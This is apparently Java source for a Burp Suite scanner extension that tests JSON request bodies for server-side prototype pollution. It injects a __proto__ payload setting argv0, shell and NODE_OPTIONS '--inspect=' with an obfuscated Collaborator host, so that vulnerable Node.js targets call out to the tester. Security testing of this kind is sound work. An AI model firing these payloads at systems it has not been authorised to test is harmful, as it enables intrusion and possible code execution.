package burp;

import com.google.gson.*;

import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static burp.PrototypePollutionBodyScan.MAX_RETRIES;

public class PrototypePollutionAsyncBodyScan extends Scan {
    final Boolean injectSpecificProperties = false;
    final static String collaboratorPlaceholder = "$collaborator_placeholder";
    static final Map<String, String[]> asyncTechniques = new HashMap<String, String[]>()
    {
        {
            put("async", new String[]{
                    "__proto__"," {\n" +
                    "\"argv0\":\"node\",\n" +
                    "\"shell\":\"node\",\n" +
                    "\"NODE_OPTIONS\":\"--inspect="+collaboratorPlaceholder+"\"\n" +
                    "}"
            });
        }
    };

    @Override
    public List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
        if(Utilities.globalSettings.getBoolean("async technique")) {
            Utilities.out("--Running async body scan--");
        }
        for (Map.Entry<String, String[]> technique : asyncTechniques.entrySet()) {
            if(!PrototypePollutionBodyScan.shouldUseTechnique(technique)) {
                continue;
            }
            ArrayList<String> collabPayloads = new ArrayList<>();
            technique.getValue()[1] = replacePlaceholderWithCollaboratorPayload(technique.getValue()[1], collabPayloads);
            doAttack(baseReq, Utilities.getBody(baseReq), service, technique, collabPayloads);
        }

        return null;
    }

    static ArrayList<String[]> getAttackJsonStrings(String jsonString, Map.Entry<String, String[]> currentTechnique) {
        ArrayList<String[]> jsonList = new ArrayList<>();
        try {
            JsonElement json = new JsonParser().parse(jsonString);
            if(json.isJsonArray() || json.isJsonObject()) {
                traverseJsonGenerateJsonAttack(json, currentTechnique, jsonList, json);
            }
            return jsonList;
        } catch(JsonSyntaxException e) {
            Utilities.err("Invalid JSON:" + e);
            return null;
        }
    }

    public void doAttack(byte[] baseReq, String jsonString, IHttpService service, Map.Entry<String, String[]> technique, ArrayList<String> collabPayloads) {
        if(!jsonString.trim().startsWith("{") && !jsonString.trim().startsWith("[")) {
            return;
        }

        if(injectSpecificProperties) {
            ArrayList<String[]> jsonList = getAttackJsonStrings(jsonString, technique);
            if (jsonList != null) {
                for (String[] json : jsonList) {
                    String attackJsonString = json[0];
                    byte[] attackRequest = baseReq.clone();
                    attackRequest = Utilities.setBody(attackRequest, attackJsonString);
                    attackRequest = Utilities.fixContentLength(attackRequest);
                    if (attackRequest != null) {
                        Resp reqResp = request(service, attackRequest, MAX_RETRIES);
                        int reqId = -1;
                        if(collabPayloads.size() > 0) {
                            reqId = BurpExtender.collab.addRequest(new MetaRequest(reqResp.getReq()));
                        }
                        for (String collabPayload : collabPayloads) {
                            if(reqId > 0) {
                                BurpExtender.collab.addCollboratorPayload(collabPayload, reqId);
                            }
                        }
                    }
                }
            }
        } else {
            JsonElement attackJson = PrototypePollutionBodyScan.generateJson(jsonString, technique.getValue(), false);
            byte[] attackRequest = baseReq.clone();
            if (attackJson != null && !attackJson.isJsonNull()) {
                attackRequest = Utilities.setBody(attackRequest, attackJson.toString());
                attackRequest = Utilities.fixContentLength(attackRequest);
                Resp reqResp = request(service, attackRequest, MAX_RETRIES);
                int reqId = -1;
                if(collabPayloads.size() > 0) {
                    reqId = BurpExtender.collab.addRequest(new MetaRequest(reqResp.getReq()));
                }
                for (String collabPayload : collabPayloads) {
                    if(reqId > 0) {
                        BurpExtender.collab.addCollboratorPayload(collabPayload, reqId);
                    }
                }
            }
        }
    }

    static JsonElement traverseJsonGenerateJsonAttack(JsonElement jsonElement, Map.Entry<String, String[]> currentTechnique, ArrayList<String[]> jsonList, JsonElement fullJsonElement) {
        if (jsonElement.isJsonNull()) {
            return null;
        }

        if (jsonElement.isJsonPrimitive()) {
            return null;
        }

        if (jsonElement.isJsonArray()) {
            JsonArray jsonArray = jsonElement.getAsJsonArray();
            if ( null != jsonArray) {
                for (int i=0;i<jsonArray.size();i++) {
                    jsonElement = traverseJsonGenerateJsonAttack(jsonArray.get(i), currentTechnique, jsonList, fullJsonElement);
                }
                if(jsonElement != null) {
                    return jsonElement;
                }
            }
            return null;
        }

        if (jsonElement.isJsonObject()) {
            JsonParser parser = new JsonParser();
            Set<Map.Entry<String, JsonElement>> jsonObjectEntrySet = jsonElement.getAsJsonObject().entrySet();
            if(jsonObjectEntrySet.size() == 0) {
                String existingPropertyName = "";
                String techniquePropertyName = currentTechnique.getValue()[0];
                String techniqueValue = currentTechnique.getValue()[1];
                jsonList.add(new String[]{PrototypePollutionBodyScan.generateJsonString(fullJsonElement, jsonElement, existingPropertyName, techniquePropertyName, parser.parse(techniqueValue))});
            } else {
                for (Map.Entry<String, JsonElement> jsonEntry : jsonObjectEntrySet) {
                    String existingPropertyName = jsonEntry.getKey();
                    String techniquePropertyName = currentTechnique.getValue()[0];
                    String techniqueValue = currentTechnique.getValue()[1];
                    jsonList.add(new String[]{PrototypePollutionBodyScan.generateJsonString(fullJsonElement, jsonElement, existingPropertyName, techniquePropertyName, parser.parse(techniqueValue))});
                    traverseJsonGenerateJsonAttack(jsonEntry.getValue(), currentTechnique, jsonList, fullJsonElement);
                }
            }
        }
        return null;
    }

    static String replacePlaceholderWithCollaboratorPayload(String vector, ArrayList<String> collabPayloads) {
        Matcher m = Pattern.compile(collaboratorPlaceholder.replace("$", "\\$")).matcher(vector);
        while (m.find()) {
            String collaboratorPayloadID = BurpExtender.collab.generateCollabId();
            collabPayloads.add(collaboratorPayloadID);
            vector = vector.replaceFirst(collaboratorPlaceholder.replace("$", "\\$"), obfuscateHost(collaboratorPayloadID+"."+BurpExtender.collab.getCollabLocation()));
        }
        return vector;
    }

    static String obfuscateHost(String host) {
        return host.replaceAll("[.]","\\\\\\\\\"\\\\\\\\\".");
    }

    PrototypePollutionAsyncBodyScan(String name) {
        super(name);
    }

}
